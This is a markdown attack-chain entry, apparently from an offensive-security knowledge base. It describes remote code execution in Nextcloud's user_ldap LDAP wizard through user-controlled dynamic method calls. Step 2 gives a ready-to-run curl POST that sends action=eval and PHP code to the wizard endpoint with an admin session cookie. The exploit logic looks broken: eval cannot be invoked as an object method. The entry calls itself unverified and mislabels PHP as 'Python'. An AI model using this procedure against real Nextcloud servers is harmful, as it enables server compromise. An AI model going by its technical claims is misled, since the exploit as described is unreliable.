---
tags:
  - rce
  - nextcloud
  - php
  - ldap
  - dynamic-function-call
type: attack_chain
tools: []
tactics:
  - '[[Execution]]'
verified: false
platforms:
  - Web
  - PHP
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Review-Nextcloud-LDAP-Wizard-Source-Code]]'
  - '[[procedures/Exploit-Dynamic-Function-Call-in-LDAP-Wizard]]'
step_count: 2
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Python]]'
updated_at: '2025-12-14T17:23:24.175Z'
description: >-
  Attack chain exploiting a PHP dynamic method invocation vulnerability in
  Nextcloud's user_ldap app to achieve remote code execution via arbitrary
  function calls.
skill_level: intermediate
impact_level: high
id: d5696477-c5f3-4257-ba2a-6d8adc0efdc9
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Python]]'
---
# RCE via Dynamic Function Call in Nextcloud LDAP Wizard

Multi-stage attack chain demonstrating a complete attack workflow targeting a vulnerability in Nextcloud's user_ldap app, where user-controlled POST parameters enable dynamic PHP method invocation on a wizard object, potentially leading to remote code execution (RCE) via functions like eval.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Code Review and Discovery] --> B[Exploit Dynamic Call]
    B --> C[RCE Achievement]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- None (manual code review and curl for exploitation)

### Target Environment

- Nextcloud instance with user_ldap app enabled
- PHP-based web application
- LDAP service integration
- Admin privileges required for access to the wizard endpoint

### Initial Access Requirements

- Valid admin session or CSRF token (mitigation factor)
- Network access to the Nextcloud instance
- No prior access needed beyond authenticated admin role

## Detailed Attack Procedures

### Step 1: Code Review and Discovery
procedure: [[procedures/Review-Nextcloud-LDAP-Wizard-Source-Code]]

**Objective**: Identify the vulnerability in the LDAP wizard endpoint by reviewing the source code for unsafe dynamic method invocation.

**Instructions**: Access the Nextcloud source code, typically from the installation directory or GitHub repository. Examine the file `/apps/user_ldap/ajax/wizard.php`. Look for lines where user input from POST parameters is used without validation to invoke methods on the `$wizard` object.

**Expected Output**: Identification of vulnerable lines, such as line 136 setting `$action = (string)$_POST['action'];` and lines 83/99 using `$wizard->$action($loginName);` with `$loginName` from `$_POST['ldap_test_loginname']`.

**Success Indicators**:
- Vulnerable dynamic call confirmed
- Potential for arbitrary function execution noted

### Step 2: Exploit Dynamic Function Call
procedure: [[procedures/Exploit-Dynamic-Function-Call-in-LDAP-Wizard]]

**Objective**: Craft and send a malicious POST request to trigger arbitrary PHP function execution, such as eval, for RCE.

**Instructions**: Use [[commands/curl-exploit-ldap-wizard]] to send a POST request to the endpoint with controlled parameters. Ensure you have admin access and handle any CSRF tokens if present.

```bash
curl -X POST 'https://target-nextcloud.com/apps/user_ldap/ajax/wizard.php' \
  -d 'action=eval' \
  -d 'ldap_test_loginname=phpinfo();' \
  -H 'Cookie: your-admin-session-cookie'
```

Validate the response for signs of execution, such as output from phpinfo() or system commands.

**Expected Output**: Server response containing output from the executed PHP code, indicating successful RCE.

**Success Indicators**:
- Arbitrary code executed on the server
- No errors from validation; response shows code output

## Attack Chain Summary

### Key Achievements

1. Discovery of unsafe dynamic method invocation in Nextcloud LDAP wizard
2. Successful crafting of exploit request for arbitrary function calls
3. Achievement of potential RCE, though mitigated by admin requirements and CSRF

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Python]] PHP

### MITRE ATT&CK Tactics

- [[Execution]] Execution

---
*Last updated: 2023-10-01T00:00:00Z*
